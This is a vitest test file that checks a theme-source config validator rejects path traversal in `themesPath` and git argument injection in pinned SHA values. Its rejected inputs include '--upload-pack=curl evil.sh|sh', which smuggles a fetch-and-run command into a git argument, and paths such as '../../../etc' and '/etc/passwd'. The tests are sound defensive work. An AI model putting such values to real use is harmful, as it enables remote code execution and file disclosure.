import { readFileSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import { PinnedShasSchema, SourceConfigSchema } from '../src/sources.js';

const ROOT = resolve(new URL('..', import.meta.url).pathname);

const validSource = {
  id: 'example',
  name: 'Example',
  repo: 'owner/name',
  url: 'https://github.com/owner/name',
  themesPath: 'themes',
  license: 'MIT',
};

/**
 * `themesPath` traversal (issue #196).
 *
 * The value reaches `git sparse-checkout set` and is joined into a filesystem
 * read path in `scripts/build.ts`. For a `local: true` source that join is
 * rooted at THIS repo, so a `..` segment escapes it.
 */
describe('SourceConfigSchema.themesPath', () => {
  it.each([
    'themes',
    'windowsterminal',
    'extras/ghostty',
    'extras/windows_terminal',
    'data-sources/native',
    'special_edition',
    'a.b/c-d',
  ])('accepts the ordinary relative path %s', (themesPath) => {
    expect(SourceConfigSchema.safeParse({ ...validSource, themesPath }).success).toBe(true);
  });

  it.each([
    ['parent traversal', '../../../etc'],
    ['embedded traversal', 'themes/../../../etc'],
    ['trailing traversal', 'themes/..'],
    ['absolute path', '/etc/passwd'],
    ['home-relative', '~/secrets'],
    ['empty', ''],
    ['leading slash segment', '/themes'],
    ['double slash', 'themes//evil'],
  ])('rejects %s', (_label, themesPath) => {
    expect(SourceConfigSchema.safeParse({ ...validSource, themesPath }).success).toBe(false);
  });

  it("the repo's own sources.json themesPath values all pass", () => {
    const raw = JSON.parse(readFileSync(join(ROOT, 'sources.json'), 'utf8')) as {
      id: string;
      themesPath: string;
    }[];
    for (const source of raw) {
      expect(
        SourceConfigSchema.safeParse({ ...validSource, themesPath: source.themesPath }).success,
        `${source.id} has themesPath "${source.themesPath}"`,
      ).toBe(true);
    }
  });
});

/**
 * Pinned-SHA argument injection (issue #193).
 *
 * `execFileSync` prevents shell injection, not argument injection: git
 * subcommands accept options after positional arguments, so a value reaching
 * an argument slot can still be read as a flag.
 */
describe('PinnedShasSchema', () => {
  it('accepts full and abbreviated hex SHAs, and "local"', () => {
    expect(
      PinnedShasSchema.safeParse({
        a: '3d3c42e5aac5ba805825da76410c181273ba90b1',
        b: 'abc1234',
        c: 'local',
      }).success,
    ).toBe(true);
  });

  it.each([
    ['git option', '--upload-pack=curl evil.sh|sh'],
    ['short option', '-u'],
    ['upper-case hex', 'ABC1234'],
    ['too short', 'abc123'],
    ['too long', 'a'.repeat(41)],
    ['non-hex', 'zzzzzzz'],
    ['branch name', 'refs/heads/main'],
    ['empty', ''],
  ])('rejects %s', (_label, sha) => {
    expect(PinnedShasSchema.safeParse({ source: sha }).success).toBe(false);
  });

  it("the repo's own .upstream-shas.json validates", () => {
    const raw = JSON.parse(readFileSync(join(ROOT, '.upstream-shas.json'), 'utf8')) as unknown;
    const result = PinnedShasSchema.safeParse(raw);
    expect(result.success, result.success ? '' : JSON.stringify(result.error.issues)).toBe(true);
  });
});
